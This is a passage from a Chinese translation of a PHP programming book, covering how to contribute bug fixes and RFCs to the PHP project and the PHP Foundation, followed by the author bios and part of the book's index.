if ( osvi.wProductType == VER_NT_WORKSTATION ) {
    major = "Windows 8";
} else {
    major = "Windows Server 2012";
}
} else {
    major = "Unknown Windows version";
}
// ...
}
// ...
}
```

如代码所示，Windows 8 在内部对应 Windows 版本 6.2。而 Windows 8.1 则是 Windows 6.3。问题是：所使用的编程接口对于 8 之后的所有 Windows 版本也只返回 6.2。因此有必要使用不同的调用。在本案例中，这已经被研究并实现。

基本流程（当然，实现除外）相对简单。GitHub 上的 PHP 仓库被 fork（大致相当于克隆），然后相应地调整 fork 中的代码。此调整随后被打包为拉取请求。如果你只需更改单个文件，甚至可以直接在浏览器中修改代码并生成拉取请求（见图 40.3；仍然推荐使用合适的开发环境）。

![](img/ae7820c36e8f24c1623d26668b28e80e_978_0.png)

图 40.3 直接在浏览器中更改 PHP C 代码！





然后，你可以在 GitHub 问题跟踪器中看到此拉取请求的 URL。你希望负责该模块的开发团队能够处理它。如果一切正常，你的补丁将被改进（或者你会被要求改进它），最终——希望如此——拉取请求会被接受（见图 40.4）。

![](img/ae7820c36e8f24c1623d26668b28e80e_979_0.png)

**图 40.4** 补丁已创建并稍后合并

你的错误修复将随后包含在下一个 PHP 版本中！你可以确定获得无穷的名声，因为那些修复过错误的人通常会在 NEWS 文件中以及发行说明中被提及（见图 40.5 和 图 40.6）。

![](img/ae7820c36e8f24c1623d26668b28e80e_979_1.png)

**图 40.5** 发行说明中修复的错误

![](img/ae7820c36e8f24c1623d26668b28e80e_980_0.png)

图 40.6 “NEWS” 文件中的更多信息——以及 15 毫秒的名声

### 40.1.2 新特性

PHP 常常被指责在某些领域（包括不一致的 API）发展得非常“有机”。为了避免将来再受此指责，PHP 项目定义了一种具有约束力的流程，在将新特性添加到 PHP 之前必须遵循该流程。整个流程称为请求评论（Request for Comments，RFC），可在 https://wiki.php.net/rfc（概述；见图 40.7）和 https://wiki.php.net/rfc/howto（逐步说明）上找到。本质上，流程如下：

- 1. 想出一个对 PHP 有用的新特性。
- 2. 发送电子邮件至 internals@lists.php.net 并描述你的想法。
- 3. 如果你没有遭到彻底拒绝，则制定 RFC（通常是一个想法加上一个实现），并使其可供讨论。
- 4. 讨论后（以及在必要时进行一些调整），你的 RFC 将进行投票。
- 5. 如果成功，你的代码将被添加到 PHP 项目中。

> **进一步阅读材料**
> 
> Christopher Jones 在 http://s-prs.co/v602258 上制定了一份更详细的 RFC 流程指南，甚至比官方 RFC 页面更进一步。Ben Ramsey 成功经历了 RFC 流程，并在演示幻灯片中描述了该流程，你可以在 http://s-prs.co/v602259 上查看。

![](img/ae7820c36e8f24c1623d26668b28e80e_981_0.png)

图 40.7 各阶段（协调、讨论等）的当前 RFC

## 40.2 进一步的选项

然而，PHP 项目提供了各种方式，即使不具备 C 语言知识也可以做出贡献。php.net/get-involved.php 上的“参与进来”页面列出了四种方法：

- 1. 你可以运行 PHP 自带的测试套件。是否发生错误？这些错误是否已知并已在错误跟踪器中报告？
- 2. 如果测试有错误，是测试本身有问题，还是 PHP 实际存在错误？这种分析（以及可能针对测试或 PHP 本身的错误修复）非常有用。PHP 质量保证团队在 http://qa.php.net/write-test.php 上提供了有关编写测试的更多信息。
- 3. 在错误跟踪器中提交错误（我们在本章中已经多次提到过）。
- 4. 扩展或翻译文档。

我们还想提及一个我们非常关注的第五个选项。PHP 基金会由 PHP 环境中的几家公司和个人创立，旨在将开源项目置于更稳定的基础上，尤其是因为 Zend（特别是 Microsoft，除了其他方面，长期以来一直支持 PHP 的 Windows 版本）的参与度已大幅下降。该组织不仅推广 PHP，还经济上支持 10¹ 名开发人员“兼职”从事 PHP 工作。如果你或你的公司从 PHP 中受益，那么将一些回馈给 PHP 基金会并不是个坏主意。有关更多信息以及支持该组织工作的方式，请访问项目网站 https://thephp.foundation（另见图 40.8）。

1 在 2024 年 1 月底提交手稿时。当前人员名单：http://s.prs.co/v6022100。

无论你自己如何参与 PHP，即使你只是自己使用它并说服朋友和同事：这也是让项目变得更大、更成功、更好的唯一方式。非常感谢！

![](img/ae7820c36e8f24c1623d26668b28e80e_982_0.png)

图 40.8 PHP 基金会主页

## 作者

![](img/ae7820c36e8f24c1623d26668b28e80e_983_0.png)

**Christian Wenz** 是一名专注于 Web 技术和 Web 安全的顾问和软件架构师。他在企业环境中主导数字化项目。他的著作已被翻译成十几种语言。

![](img/ae7820c36e8f24c1623d26668b28e80e_983_1.png)

**Tobias Hauser** 是一名顾问、培训师和作者。他专注于基于 PHP 的 Web 应用程序，为公司提供支持，涵盖从系统选择到接口架构的一切，并定期撰写关于 Web 话题的文章。

## 索引

- - ........................ 114
- -- ........................ 115
- \\ ........................ 106–107, 296
- \\\\ ........................ 100, 106–107
- ` ........................ 129
- ^ ........................ 126, 296
- __autoload()（函数） ........ 351
- __call()（方法） ........ 341
- CLASS（常量） ........ 333
- __construct()（方法） ........ 321
- __destruct()（方法） ........ 323
- DIR（常量） ........ 718
- FILE（常量） ........ 718
- FUNCTION（常量） ........ 352
- get()（方法） ........ 343
- METHOD（常量） ........ 351
- NAMESPACE（常量） ........ 380
- set()（方法） ........ 344
- sleep()（方法） ........ 357
- soapCall()（方法） ........ 767
- toString()（方法） ........ 352
- wakeup()（方法） ........ 357
- ! ........................ 124
- != ........................ 117
- !== ........................ 118, 939
- ? ........................ 297
- . ........................ 201, 296
- ..（运算符） ........ 166, 258, 339
- .htaccess ........ 896, 918
- .php ........ 37
- \\ ........ 101
- [^ADZ] ........ 296
- [] ........ 240, 296
- [a-z] ........ 296
- { ........ 136
- {} ........ 296
- } ........ 136
- @ ........ 129
- * ........ 114, 297
- ** ........ 115
- **= ........ 116
- *= ........ 115
- / ........ 114, 298
- /* ........ 95
- /* ... */ ........ 95
- // ........ 95
- /= ........ 115
- & ........ 110, 126
- && ........................ 123
- <?php ........................ 93
- # ........................ 95
- #[Override] ........................ 40, 309
- #[AllowDynamicProperties] ........................ 40, 309
- % ........................ 114
- %= ........................ 115
- + ........................ 114, 297
- ++ ........................ 115
- += ........................ 115
- < ........................ 117
- <% ........................ 94
- << ........................ 126
- <<< ........................ 193
- <= ........................ 117
- <=> ........................ 123
- <> ........................ 117
- <br /> ........................ 204
- -= ........................ 115
- = ........................ 101, 241
- == ........................ 117
- === ........................ 118, 939
- > ........................ 117
- >= ........................ 117
- >> ........................ 126
- | ........................ 126, 297
- || ........................ 124
- ~ ........................ 126
- $ ........................ 101, 107, 296
- $COOKIE ........ 111, 263, 469
- $ENV ........ 111, 263
- $FILES ........ 111, 263, 445, 745
- $GET ........ 111, 263, 867
- $POST ........ 111, 263, 867
- $REQUEST ........ 111, 263
- $SERVER ........ 111, 263
- $SERVER[PHP_AUTH_PW] ........ 901
- $SERVER[PHP_AUTH_USER] ........ 901
- $SESSION ........ 111, 263, 486
- $GLOBALS ........ 111, 171
- $HTTPS_COOKIE_VARS ........ 407
- $HTTP_GET_VARS ........ 112, 407
- $HTTP_POST_FILES ........ 407
- $HTTP_POST_VARS ........ 407
- $HTTP_SERVER_VARS ........ 262, 407
- $this ........ 315
- \0 ........ 215
- \000 ........ 107





- \1, \2, \3 ........................ 297
- 10gen ............................. 685
- array_rand() （函数） ........................ 260
- array_reverse() （函数） ........................ 260
- array_search() （函数） ........................ 260
- array_shift() （函数） ........................ 251
- array_slice() （函数） ........................ 252
- array_splice() （函数） ........................ 253
- array_unshift() （函数） ........................ 251
- array_values() （函数） ........................ 260
- array_walk_recursive() （函数） ................ 249
- array_walk() （函数） ........................ 249
- array() .................................... 239
- 数组 ................................. 102, 239
    - 关联数组 ............................ 242
    - 更改 ................................. 241
    - 连接 ................................ 254
    - 创建 ................................. 239
    - 删除元素 ........................ 242
    - 全局 ................................. 262
    - 迭代 .............................. 244
    - 多维数组 ....................... 243
    - 简写 .............................. 243
    - 排序 ................................... 260
- 超全局 ............................ 111, 261
- 转换 .............................. 251
- 变量 .............................. 256
    - 带循环 ............................. 244
- ASCII .................................. 118
    - 代码 ................................... 118
    - 转换 ............................. 233
- asp_tags (php.ini) ....................... 94
- 赋值运算符 .................... 101, 241, 312
- 关联数组 ..................... 242
- 结合性 .......................... 134
- asXML() （方法） ....................... 804
- 原子性 .............................. 538
- 属性 ............................. 372
- attributes() （方法） .................. 803
- 身份验证
    - Apache ................................. 896
    - 基础 .................................. 896
    - 结论 ............................ 915
    - 摘要 ................................. 896
    - HTTP ................................... 895, 901
    - 会话 ............................... 895
    - 基于标准 ........................ 895, 903
    - Web 服务器 ............................. 895
    - 带会话 .......................... 491
- AuthName ............................... 897
- AuthType ............................... 898
- Ayala, Dietrich ........................ 752

## A

- abs() （函数） ........................ 275
- 抽象 .............................. 335
- 抽象类 ...................... 335
- 抽象类 ................... 341
- ACID 原则 ........................ 538
- Acrobat ............................... 845
- Active Server Pages ................... 94
- add() （方法） ........................ 294
- addslashes() （函数） ............... 224
- addFunction() （方法） ................ 766
- AddPage() （方法） .................... 859
- addslashes() （函数） .... 223, 546, 774, 880
- Adermann, Nils ........................ 955
- Adobe ................................. 845
- Ajax .................................. 777
- allow_url_fopen (php.ini) ............. 98
- allow_url_include (php.ini) ........... 873
- Alshanetsky, Ilia ..................... 542
- and ................................... 123
- 匿名类 ..................... 336
- 匿名函数 ................... 174
- Apache ........................ 35, 49, 947
    - 2.x ................................. 54, 947
    - 身份验证 ........................ 896
    - 结束进程 ........................... 953
    - htdocs ................................ 55
    - 安装 .......................... 70
    - 集成其他技术 .......... 952
    - 虚拟路径 .......................... 953
- apache_get_modules() （函数） ....... 948
- apache_get_version() （函数） ....... 948
- Apache for Windows .................... 54
- appendChild() （方法） ................ 808
- 软件架构 ........... 748
- 算术运算符 .................. 113
    - 简写形式 ........................... 114
- array_combine() （函数） ............ 255
- array_fill() （函数） ............... 257
- array_filter() （函数） ............. 208
- array_flip() （函数） ............... 260
- array_key_exists() （函数） ......... 260, 471
- array_keys() （函数） ............... 260
- array_map() （函数） ................ 250
- array_merge_recursive() （函数） .... 255
- array_merge() （函数） .............. 254
- array_pop() （函数） ................ 251
- array_push() （函数） ............... 251

## B

- \b ........................ 296
- 支持的枚举 ............... 186
- 反斜杠 ................. 106
- base_convert .............. 271
- base64_decode() ........... 736
- base64_encode() （函数） . 518, 719, 736
- basename() （函数） ..... 446
- BC （二进制计算器） .... 276
- bcadd() （函数） ........ 277
- bccomp() （函数） ....... 278
- bcdiv() （函数） ........ 278
- bcmath.scale (php.ini) .... 277
- bcmod() （函数） ........ 278
- bcmul() （函数） ........ 277
- bcpow() （函数） ........ 278
- bcpowmod() （函数） ..... 278
- bcscale() （函数） ...... 277
- bcsqrt() （函数） ....... 278
- bcsub() （函数） ........ 277
- Bergmann, Sebastian ....... 941
- 二进制大对象 ...... 653
- 二进制模式 ............... 710
- 二进制 ............. 125, 127, 270
- bindec() （函数） ....... 270
- 位运算符 ......... 124
- BLOB ...................... 580, 653
- BLOB (SQL) ................ 527
- Boergers, Marcus .......... 542
- Boggiano, Jordi ........... 955
- 布尔 ................... 102
- BOOLEAN (SQL) ............. 527
- Bouteil, Thomas ........... 824
- break ..................... 142–143, 155
- 浏览器切换 ............ 264
- 引用传递 .................... 110
- bzip2 ..................... 738

## C

- C ......................... 33, 965
- 编译器 .................. 70
- call_user_func_array() （函数） ... 190
- call_user_func() （函数） ......... 190
- call() （方法） ........... 760
- 规范化 .............. 724
- CAPTCHA ................... 886
- 情况区分 ......... 135
    - if 和 switch 的比较 ....... 145
    - if ................................ 136
    - 嵌套 ........................... 141
    - if 的简写形式 ........ 139
    - switch .................... 142
- 不区分大小写 .......... 213
- ceil() （函数） ......... 275
- Cell() （方法） ........... 850, 859
- CGI ....................... 46, 947
- 变更日志 ................. 44
- char() （函数） ......... 212
- CHAR (SQL) ................ 527
- 复选框 ................ 413
    - 验证 .................. 424
- checkdate() （函数） .... 288, 292
- 检查 IP 地址 .......... 502
- chop() （函数） ......... 216
- chr() （函数） .......... 233
- Chrome
    - Cookie ................... 457
- chunk_split() （函数） .. 202
- class ..................... 310
- 类 ................... 309
    - 抽象 ................ 335
    - 类类型 ............. 353
- CLI ....................... 47
- 客户端-服务器模型 ....... 36
- color() （函数） ........ 836
- 注释 .................. 94
- COMMIT (SQL) .............. 539
- compact() （函数） ...... 257
- 比较运算符 ...... 117
- Composer .................. 75, 386, 689, 783, 955
    - composer.json ........... 959, 961
    - 安装 ............ 955
    - 安装包 ........ 957
    - 更新包 ......... 960
- composer.json ............. 959
- compress.bzip2 ............ 729
- compress.zlib ............. 729
- 压缩 ............... 744
- 压缩流 ....... 738
- 连接 ............. 116, 201
- 条件运算符 ...... 130
- 带零检查的条件运算符 ... 131
- 配置 ............. 920
- configureWSDL() （方法） .. 761
- 一致性 ............... 538
- const ..................... 112
- 常量 ................. 112, 338
    - final ................... 339
    - 魔术常量 ................... 351
    - 数学常量 ............ 268
    - 可见性 .............. 339
- 构造函数 ............... 321




消费者 .................................................... 748

内容安全策略 ................................... 873

内容类型 .............................................. 824

continue .................................................. 157

转换 .................................................. 269

convert.base64-decode（过滤器） ............................ 736

convert.base64-encode（过滤器） ............................ 736

convert.quoted-printable-decode（过滤器） .................. 736

convert.quoted-printable-encode（过滤器） ................ 736

Cookie ................................................... 457, 481
- 浏览器 ................................................. 457
- Cookie 测试 ............................................. 476
- 删除 .................................................. 471
- 域 .................................................. 463
- 过期日期 ......................................... 462
- HttpOnly ................................................ 872
- HTTPS ................................................... 464
- 新 Cookie ............................................. 474
- 路径 .................................................... 463
- 永久 ............................................... 462
- 持久 .............................................. 462
- 问题 ................................................ 479
- 读取 .................................................... 469
- 限制 ............................................ 460
- SameSite ................................................ 466, 885
- 特殊字符 ...................................... 468
- 规范 ........................................... 459
- 临时 ............................................... 462

坐标 ................................................. 826

copy()（函数） ........................................... 716

CORBA ....................................................... 747

cos()（函数） ............................................ 276

COUNT_RECURSIVE（常量） ................................ 250

COUNT（SQL） ................................................. 536

倒计时 ................................................... 291

计数器变量 ............................................ 154

create_function()（函数） ................................ 189

CREATE DATABASE（SQL） ....................................... 528

createFromFormat()（方法） ................................. 286

CREATE TABLE（SQL） .......................................... 528

createTextNode()（方法） ................................... 808

跨站点脚本 ........................................ 869

crypt()（函数） .......................................... 235, 892

CSRF ........................................................ 503, 881

CSV ........................................................ 371

ctype_alnum()（函数） .................................... 700

current()（函数） ........................................ 248

current()（方法） .......................................... 361

### D

\d .......................................................... 296

数据库
- 抽象类 ....................................... 541
- 聚合函数 ....................................... 536
- 数据库设计 ........................................... 534
- 数据类型 ................................................ 527
- 日期值 ............................................... 528
- 连接 ..................................................... 536
- MySQL 服务器 ............................................. 621
- MySQL ..................................................... 559
- mysqli .................................................... 559
- Oracle .................................................... 641
- PostgreSQL ................................................ 661
- 保存会话 ............................................. 493
- 序列 ................................................. 652
- SQLite .................................................... 599
- 存储过程 ......................................... 539, 630
- 事务 .............................................. 577

数据源名称 ............................................ 544

数据类型
- 数组 .................................................... 102
- BLOB ...................................................... 653
- 布尔型 ................................................... 102
- 确定 ................................................. 102
- 双精度型 .................................................... 102
- 用于数据库 ............................................. 527
- 整型 ................................................... 101
- LOB ....................................................... 653
- MySQL ..................................................... 570
- NULL ...................................................... 102
- 对象 .................................................... 102
- 实型 ...................................................... 102
- 资源 .................................................. 102
- SERIAL .................................................... 670
- 字符串 .................................................... 101

日期 ........................................................ 267, 278
- 任意值 ................................................ 284
- 倒计时 ................................................. 291
- 当前 ................................................... 278
- Cookie 过期 .................................... 462
- 格式 .................................................... 289
- 格式详情 ............................................ 280
- 来自字符串 .............................................. 286
- GNU 准则 ............................................ 288
- 本地设置 ............................................. 290
- 时间戳 ................................................. 285

date_default_timezone_get()（函数） ...................... 290

date_default_timezone_set()（函数） ...................... 290

date_parse_from_format()（函数） ......................... 287

date()（函数） ........................................... 278, 591

DATE（SQL） .................................................. 527

DateTime（类） ............................................ 278

DateTime（对象） ........................................... 283

数据库
- 连接到数据库 ....... 544

DCOM ........................ 747

数据库 .......................... 46

调试器
- Xdebug ...................... 935

调试 ................... 931
- 手动 ..................... 933

decbin()（函数） ......... 270

dechex()（函数） ........ 270

DECIMAL（SQL） ............... 527

声明 ..................... 163

declare()（函数） ........ 180

decoct()（函数） ........ 270

递减 ................... 115

default ..................... 144

define()（函数） ......... 112

deg2rad()（函数） ........ 276

设计模式 .............. 326, 385
- 适配器 ..................... 394
- 工厂 ..................... 394
- 四人组 ................ 385
- MVC ......................... 387

析构函数 .................. 323

图表
- cake ........................ 830
- 动态 ..................... 837

diff()（方法） ............. 293

dir（类） ................. 716

指令 ................... 47

dirname()（函数） ........ 718

除法 .................... 113

Dll ......................... 61

documentElement（属性） .... 808

DOM ......................... 796, 805
- XPath ....................... 810

dom_import_simplexml()（函数） . 805

DOMDocument（类） ......... 806

DOMElement（类） .......... 811

DOMNode（类） ............. 807, 811

DOMXPath（类） ............ 810

双精度型 ...................... 102

do-while .................... 159

DTD ......................... 793, 812

持久性 .................. 538

### E

each()（函数） ........... 249

EasyPHP Devserver ........... 49

echo（语句） ............ 96, 99, 193, 933

else ........................ 138

elseif ...................... 137

电子邮件 ...................... 505
- bcc ......................... 511
- cc .......................... 511
- 内容 ID .................. 519
- IMAP ........................ 521
- 加载 ........................ 521
- MIME ........................ 514
- POP ......................... 521
- 回复至 .................... 512
- 设置 .................... 508
- x-priority .................. 511

empty()（函数） .......... 250, 471

empty()（指令） ....... 108

-enable-exif（开关） ....... 817

-enable-ftp（开关） ........ 741

-enable-soap（开关） ....... 753

-enable-trans-sid（开关） ... 483

封装 ............... 324

encodeURIComponent()（JavaScript） ... 776

加密 .................. 234
- MD5 ......................... 234
- 美国安全 ................... 234

end()（函数） ............ 249

endfor ...................... 152

无限循环 ............... 150

endwhile .................... 155

ENT_COMPAT（常量） ....... 226

ENT_NOQUOTES（常量） ..... 226

ENT_QUOTES（常量） ....... 226

枚举 ................ 185

eof ......................... 713

等于 ....................... 117

相等性
- 准确的 .................... 118

错误 ....................... 931
- 解析器 ...................... 931
- 搜索 ...................... 931

error.log ................... 87

错误消息 ............... 931

错误抑制 ........... 129

转义序列 ............ 106

事件处理程序 ............... 797

exec()（函数） ........... 716

EXIF ........................ 817

explode()（函数） ........ 207-208

指数运算符 ........ 115

表达式 .................. 95

可扩展标记语言（XML） ... 791

可扩展样式表语言
- 转换（XSLT） ....... 794

扩展 .................. 61





- 编译 971
- 模块未找到 83
- PECL 965
- php.ini 927
- 外部脚本 96
- EXTR_IF_EXISTS (常量) 257
- EXTR_OVERWRITE (常量) 257
- EXTR_SKIP (常量) 257
- extract() (函数) 256

### F

- 工厂 394
- FastCGI 46
- fclose() (函数) 710
- feof() (函数) 713
- fgetc() (函数) 713
- fgetcsv() (函数) 582, 712, 733
- fgets() (函数) 741
- Fibers 741
- 菲尔丁, R. T. 748
- 文件 728
- FILE_APPEND (常量) 712
- file_exists() (函数) 714
- file_get_contents() (函数) 673, 712, 730, 755, 798
- file_put_contents() (函数) 711
- file() (函数) 722
- 文件浏览器 723
- Filemon 707
- 文件操作 707
  - 处理 708
  - 信息 714
  - 锁 721
  - 模式 709
  - 操作 715
  - 路径 710
  - 读取 712
  - 在文件系统中的作用 714
  - 设置 725
  - 写入 710
- 文件上传 444
  - 进度 448
- 过滤器 729, 735
- filter_input() (函数) 878
- filter_var() (函数) 881
- final 328
- Firefox, Cookie 459
- flex 70
- flock() (函数) 721
- floor() (函数) 275
- 字体 828

- GD 2 827
- TrueType 828
- fopen() (函数) 582, 708, 728
- for 149
  - 替代语法 151
  - 用于数组 244
- foreach 245
  - 用于数组 245
  - 读取索引 247
- 表单访问 455
  - 设置 455
- 表单检查 448
- 表单 403
  - 复选框 403
  - 多行文本字段 403
  - 在线密码字段 403
  - 单选按钮 403
  - register_long_arrays 407
  - 选择列表 403
  - 语义化表单元素 410
  - 发送按钮 403
  - 单行文本字段 403
- 表单解释器 33
- 表单验证 421
  - 使用 JavaScript 448
- 马丁·福勒 385
- fpassthru() (函数) 712
- FPFD 847, 859
- FPDF (类) 859
- from() (方法) 187
- fseek() (函数) 713
- fsockopen() (函数) 733
- FTP 727
- FTP_ASCII (常量) 741
- FTP_BINARY (常量) 741
- ftps 728
- FTP 流 735
- func_get_arg() (函数) 168
- func_get_args() (函数) 167
- func_num_args() (函数) 167
- function_exists() (函数) 188
- function (关键字) 163
- 函数 163
  - 匿名 174
  - 声明 163
  - 默认值 165
  - 来自 PHP 190
  - 从不 185
  - 未定义 86
  - 参数 164
  - 递归 176
  - 返回值 171
  - 类型声明 178
  - 联合类型 183
  - 变量的有效性 169
- 韦兹·弗隆 542
- fwrite() (函数) 710, 733

### G

- 埃里希·伽玛 398
- 四人帮 385
- gcc 70
- GD 2 823
- 生成器 177
- get_html_translation_table() (函数) 228
- get_resource_id() (函数) 567
- getAttributes() (方法) 374
- getBytes() (方法) 273
- getdate() (函数) 278
- getdate() (SQL 函数) 539
- getElementById() (方法) 807
- getElementsByTagname() (方法) 807
- getFloat() (方法) 273
- getInt() (方法) 273
- getIterator() (方法) 360
- getrandmax() (函数) 272
- getTimestamp() (方法) 285
- gettype() (函数) 102
- Git 57
- GitHub 977, 780
- global (关键字) 170
- 全局变量 169
- GlobIterator 371
- gmdate() (函数) 291
- gmkmktime() (函数) 291
- gmstrftime() (函数) 291
- GMT 291
- Google API 904
- go-pear.phar 75
- goto 161
- 图形 823
  - 背景颜色 825
  - 坐标 826
  - 文件类型 824
  - 灰度 834
  - 缩小图像尺寸 832
  - 形状 829
  - 文本 826
- GraphicsMagick 843
- 访客留言本 550, 718
- 安迪·格特曼斯 33
- gzip 738

### H

- handle() (方法) 766
- Hash() 234
- hash() (函数) 235
- header() (函数) 475, 873, 901
- heredoc 语法 193
- 十六进制 107, 269
- hexdec() (函数) 270
- 哈特穆特·霍尔茨格雷费 967
- Homebrew 64
- 托管 44
- htdocs 55, 74
- HTML 225
  - PHP 集成 93
  - 特殊字符 225
- html_entity_decode() (函数) 227
- Html2Pdf() (类) 857
- htmlentities() (函数) 228
- htmlspecialchars() (函数) 227, 409, 591, 712, 743, 797, 872
- htpasswd 897
- HTTP 36, 457, 727
  - 认证 895, 901
  - Set-Cookie2 474
  - X-Mailer 511
- httpd.conf 73, 84, 918
- HTTPS 464, 727-728
- HTTP 流 729

### I

- idate() (函数) 290
- 身份提供者 904
- if 136
  - 嵌套 141
  - 简写形式 139
- IIS 51
- imagecolorallocate() (函数) 825
- imagecolorallocatealpha() (函数) 835
- imagecolorclosest() (函数) 835
- imagecolorclosestalpha() (函数) 835
- imagecolorsforindex() (函数) 834, 836
- imagecolortotal() (函数) 834
- imagecolortransparent() (函数) 835
- imagecopyresized() (函数) 832
- imagecreate() (函数) 825
- imagecreatefromGIF() (函数) 832
- imagecreatefromJPEG() (函数) 832
- imagecreatefrompng() (函数) 832
- imagecreatetruecolor() (函数) 824
- imagedestroy() (函数) 825





- 图像编辑
  - 缩小图像大小 ...... 832
  - imagefilledarc() (函数) .... 829
  - imagefilledellipse() (函数) ... 829
  - imagefilledpolygon() (函数) .... 829
  - imagefilledrectangle() (函数) ... 825, 829
  - imagegif() (函数) ...... 825, 832
  - imagejpeg() (函数) ...... 825, 832
  - imageline() (函数) ....... 831
  - imagelinetstyle() (函数) .... 831
  - ImageMagick ...... 823, 842
  - imagepng() (函数) ....... 825
- 图像处理 ...... 832
  - 灰度 ...... 834
  - imagerectangle() (函数) .... 831
  - imagesetpixel() (函数) ..... 836
  - imagesetthickness() (函数) ... 831
  - imagestring() (函数) ....... 826
  - imagestringup() (函数) .... 827
  - imagetruecolortopalette() (函数) ... 836
  - imageftbbox() (函数) ...... 828
  - imagefttext() (函数) ....... 828
- IMAP ...... 521
- IMG_COLOR_STYLED (常量) ....... 831
- IMG_COLOR_STYLED_BRUSHED (常量) ...... 832
- implode() (函数) ...... 211
- importStylesheet() (方法) ...... 813
- in_array() (函数) ...... 250
- include_once() (语句) ...... 97
- include_path (php.ini) ...... 99, 710
- include() (语句) ...... 96
- 递增 ...... 115
- 不等 ...... 117
- 不等式
  - 精确 ...... 118
- 继承 ...... 317
- ini_set() (函数) ...... 99, 919
- 输入 ...... 729
- 输入过滤器 ...... 878
- 安装 ...... 45
  - 手动 ...... 50, 70
  - 常见错误 ...... 79
  - 发行版 ...... 67
  - Linux ...... 67
  - Mac ...... 62
  - MySQL ...... 559
  - nginx ...... 67
  - 软件包 ...... 67
  - PEAR ...... 75
  - PostgreSQL ...... 661
  - SQLite ...... 599
- 测试 ...... 55
- Web 服务包 ...... 752
- Windows ...... 48
- XML ...... 796
- 指令块 ...... 94
- 指令 ...... 95
- 绝缘 ...... 538
- INT (SQL) ...... 527
- intdiv() (函数) ...... 43, 268
- 整数 ...... 101
- 解释 ...... 37
- IP，识别 ...... 900
- is_array() (函数) ...... 250
- is_bool() (函数) ...... 102
- is_callable() (函数) ...... 174
- is_dir() (函数) ...... 714, 723
- is_executable() (函数) ...... 714
- is_file() (函数) ...... 714
- is_link() (函数) ...... 714
- is_null() (函数) ...... 109
- is_numeric() (函数) ...... 103
- is_readable() (函数) ...... 714
- is_string() (函数) ...... 102
- is_uploaded_file() (函数) .... 447, 714, 744
- is_writable() (函数) ...... 714
- ISO ...... 791
  - ISO-8859-1 ...... 800
  - ISO-8859-15 ...... 227
- isset() (函数) ...... 189, 250, 410, 471
  - 替代 ...... 131
  - 语句 ...... 107
- 迭代 ...... 360
  - 针对数组 ...... 244
  - 按函数 ...... 248

## J

- JavaScript ...... 771, 871
  - JavaScript 对象表示法 ...... 749
  - json() (函数) ...... 212
- 连接 ...... 536
- Jones, Christopher ...... 982
- JPEG ...... 824
- JSON ...... 243, 749, 781
- json_decode() (函数) ....... 754, 781
- json_encode() (函数) ....... 755, 781, 873
- json_validate() (方法) ...... 756
- JWT ...... 904

## K

- KCachegrind ...... 939
- Kerberos ........................ 900
- key() (函数) ................ 249
- key() (方法) .................. 361

## L

- Laminas ........................ 386
  - 适配器 .................... 394
  - 工厂 .................... 394
  - MVC ........................ 387
- LAMPP ........................ 69
- 语言结构 ............. 192
- 大对象 .................. 653
- 晚期静态绑定 ............ 333
- Lerdorf, Rasmus ................ 33, 878, 967
- levenshtein() (函数) ........ 232
- libtool ........................ 70
- libxml2 ........................ 796
- LIKE (SQL) ..................... 531
- Linux .......................... 67
  - 安装包 ...... 67
  - RPM ........................ 46
- list() (语言结构) .... 255
- LiveScript ..................... 771
- load() (方法) ................ 653, 806
- loadHTML() (方法) ............ 806
- loadHTMLFile() (方法) ........ 806
- loadXML() (方法) ............. 806
- LOB ............................ 653
- localhost ...................... 56
- location.href (JavaScript) ..... 776
- LOCK_EX (常量) ............. 712
- 日志 ........................ 923
- 逻辑运算符 .............. 123
- 循环 .......................... 149
  - do-while ................... 159
  - 无限 .................... 150
  - for ........................ 149
  - 针对数组 ................. 244
  - 嵌套 ....................... 153
  - while ...................... 153
- ltrim() (函数) ............. 216
- Lynx ........................... 742

## M

- M_1_PI (常量) .............. 269
- M_2_PI (常量) .............. 269
- M_2_SQRTPI (常量) .......... 269
- M_E (常量) ................. 269
- M_LN10 (常量) .............. 269
- M_LN2 (常量) ............... 269
- M_LOG10E (常量) ............ 269
- M_LOG2E (常量) ............. 269
- M_PI_2 (常量) .............. 269
- M_PI_4 (常量) .............. 269
- M_PI (常量) ................ 269
- M_SQRT1_2 (常量) ........... 269
- M_SQRT2 (常量) ............. 269
- 机器对机器通信 ..... 748
- macOS .......................... 62
  - Homebrew ................... 64
- Macports ....................... 66
- 魔术常量 ................. 351
- mail.add_x_header (php.ini) .... 509
- mail.force_extra_parameters (php.ini) ... 509
- mail.log (php.ini) ............. 509
- mail.mixed_if_and_crlf (php.ini) .... 509
- mail() (函数) .............. 510
- 邮件列表 .................. 88
- MariaDB ........................ 49, 559
- 数学 .................... 267
  - 常量 .................. 268
  - 转换 .................... 269
  - 函数 .................. 267
  - 高精度 ............ 276
  - 最大数 ............. 274
  - 最小数 ............. 274
  - 运算符 .................. 267
  - 幂 ...................... 267
  - 弧度 .................... 276
  - 随机数 ............. 272
  - 四舍五入 ...................... 275
  - 平方根 ................ 267
- max() (函数) ............... 274
- mbstring ....................... 236-237
- mcrypt ......................... 235
- MD5 ............................ 892
- md5_file() (函数) .......... 234
- md5() (函数) ............... 234, 892
- 方法 ........................ 309, 313
  - 参数 ................. 313
  - 返回值 ............... 314
- Microsoft ...................... 621
- Microsoft SMTP 服务 ......... 507
- Microsoft SQL Server ........... 621
- 适用于 PHP 的 Microsoft SQL Server 驱动程序 ..... 623
- Microsoft SQL Server Express 版 .... 621
- microtime() (函数) ......... 285
- MIME ........................... 514, 951
  - Content-Type ............... 514
- 最小值 .................... 274
- min() (函数) ............... 274
- mkdir() (函数) ............. 716
- mktime() (函数) .................... 285, 462
- modify() (方法) ...................... 294
- 模块化编程 .................... 96
- 取模 ............................... 114
- MongoDB .............................. 685
  - 客户端 (类) ..................... 691
  - 连接设置 ................... 691
  - 删除数据 ........................ 697
  - deleteMany() (方法) .............. 697
  - deleteOne() (方法) ............... 700
  - 下载 ........................... 685
  - find() (方法) .................... 693, 699
  - findOne() (方法) ................. 695, 702
  - findOneAndDelete() (方法) ........ 700
  - getInsertedId() (方法) ........... 698
  - 插入数据 ........................ 692
  - insertOne() (方法) ............... 692
  - 安装 ....................... 686
  - PHP 扩展 ...................... 687
  - 查询数据 ......................... 693
  - replaceOne() (方法) .............. 695, 702
  - 设置 ........................... 704
  - 更新数据 ........................ 695
  - updateMany() (方法) .............. 695
  - updateOne() (方法) ............... 695
- MongoDB\Client (类) ..................... 691
- MongoDB Inc. ......................... 685
- MongoDB PHP 库 .................. 689
- move_uploaded_file() (函数) ........ 447
- mysqli_max_links (php.ini) ............. 597
- mssql.max_persistent (php.ini) ......... 597
- MS SQL Server
